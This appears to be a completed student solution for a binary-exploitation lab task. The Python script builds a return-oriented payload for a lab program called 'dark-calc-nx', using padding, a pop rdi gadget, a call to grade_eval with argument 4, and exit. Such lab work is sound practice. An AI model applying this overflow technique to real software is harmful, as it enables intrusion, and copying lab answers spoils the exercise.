#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

def p64(x):
    return x.to_bytes(8, "little")

offset = 24

pop_rdi_ret = 0x401a33
grade_eval  = 0x401978
exit_plt    = 0x4016e0

payload = b"A" * offset
payload += p64(pop_rdi_ret)
payload += p64(4)
payload += p64(grade_eval)
payload += p64(exit_plt)
payload += p64(0)

sys.stdout.buffer.write(payload)
